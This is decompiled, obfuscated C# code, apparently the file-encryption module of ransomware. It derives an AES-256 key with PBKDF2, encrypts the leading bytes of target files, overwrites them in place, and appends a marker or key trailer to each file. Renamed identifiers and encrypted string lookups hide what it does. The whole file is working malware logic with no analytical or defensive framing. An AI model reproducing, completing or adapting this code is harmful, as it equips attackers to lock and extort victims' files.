using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace vlFwgXmbIo;

public static class vbCIKVbhqx
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] sSRSaFyGDhu(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = GNUWdLmaSQC(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes GNUWdLmaSQC(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] BYkQAgVUBLyxo(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (RQEwPOshulKqs.JMHEmrUMtFhk == getString_0(107396915))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (RQEwPOshulKqs.rcFXGcWApOJB)
			{
				try
				{
					File.AppendAllText(RQEwPOshulKqs.nPLbuhisBzmHoeaY, getString_0(107389025) + string_0 + getString_0(107403789) + ex.Message + getString_0(107396351));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool IEfuzgSYhKmrIk(string GBvLgTwuHXdjy, byte[] oNXixkHbkQIFSeb, byte[] oZzmHOGHcgTH = null)
	{
		try
		{
			byte[] array = null;
			if (RQEwPOshulKqs.JMHEmrUMtFhk == getString_0(107396915))
			{
				array = (RQEwPOshulKqs.JweQHtvwAVLtP ? Encoding.ASCII.GetBytes(RQEwPOshulKqs.JqDJfBiOyDaAy(RQEwPOshulKqs.dpoPluCxxOZ) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403219)) + Convert.ToString(RQEwPOshulKqs.NzKGGrtTBpkeMR) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403219))) : Encoding.ASCII.GetBytes(RQEwPOshulKqs.JqDJfBiOyDaAy(RQEwPOshulKqs.dpoPluCxxOZ) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403196)) + Convert.ToString(RQEwPOshulKqs.NzKGGrtTBpkeMR) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403196))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(GBvLgTwuHXdjy, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(oNXixkHbkQIFSeb, 0, oNXixkHbkQIFSeb.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(GBvLgTwuHXdjy, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!RQEwPOshulKqs.JweQHtvwAVLtP)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(oZzmHOGHcgTH, 0, oZzmHOGHcgTH.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (RQEwPOshulKqs.JweQHtvwAVLtP ? Encoding.ASCII.GetBytes(RQEwPOshulKqs.JqDJfBiOyDaAy(RQEwPOshulKqs.dpoPluCxxOZ) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403219)) + Convert.ToString(RQEwPOshulKqs.NzKGGrtTBpkeMR) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403219))) : Encoding.ASCII.GetBytes(RQEwPOshulKqs.JqDJfBiOyDaAy(RQEwPOshulKqs.dpoPluCxxOZ) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403196)) + Convert.ToString(RQEwPOshulKqs.NzKGGrtTBpkeMR) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403196))));
				FileStream fileStream2 = new FileStream(GBvLgTwuHXdjy, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(oNXixkHbkQIFSeb, 0, oNXixkHbkQIFSeb.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(GBvLgTwuHXdjy, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!RQEwPOshulKqs.JweQHtvwAVLtP)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(oZzmHOGHcgTH, 0, oZzmHOGHcgTH.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			RQEwPOshulKqs.TdmvufTfNVtQu++;
		}
		catch (Exception ex)
		{
			if (RQEwPOshulKqs.rcFXGcWApOJB)
			{
				try
				{
					File.AppendAllText(RQEwPOshulKqs.nPLbuhisBzmHoeaY, getString_0(107389025) + GBvLgTwuHXdjy + getString_0(107403178) + ex.Message + getString_0(107396351));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (RQEwPOshulKqs.JweQHtvwAVLtP ? Encoding.ASCII.GetBytes(RQEwPOshulKqs.JqDJfBiOyDaAy(RQEwPOshulKqs.dpoPluCxxOZ) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403219)) + Convert.ToString(RQEwPOshulKqs.NzKGGrtTBpkeMR) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403219))) : Encoding.ASCII.GetBytes(RQEwPOshulKqs.JqDJfBiOyDaAy(RQEwPOshulKqs.dpoPluCxxOZ) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403196)) + Convert.ToString(RQEwPOshulKqs.NzKGGrtTBpkeMR) + RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107403196))));
				FileStream fileStream4 = new FileStream(GBvLgTwuHXdjy, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(oNXixkHbkQIFSeb, 0, oNXixkHbkQIFSeb.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(GBvLgTwuHXdjy, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!RQEwPOshulKqs.JweQHtvwAVLtP)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(oZzmHOGHcgTH, 0, oZzmHOGHcgTH.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static vbCIKVbhqx()
	{
		Strings.CreateGetStringDelegate(typeof(vbCIKVbhqx));
	}
}
